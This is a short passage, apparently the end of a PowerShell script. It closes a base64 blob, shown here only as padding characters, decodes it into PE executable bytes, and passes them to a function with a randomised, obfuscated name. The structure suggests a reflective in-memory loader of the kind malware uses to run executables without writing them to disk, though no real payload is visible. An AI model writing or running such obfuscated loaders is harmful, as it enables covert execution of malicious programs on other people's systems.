AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="

[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
Invoke-YZSIPFNXTHVFWKM -PEBytes $PEBytes

}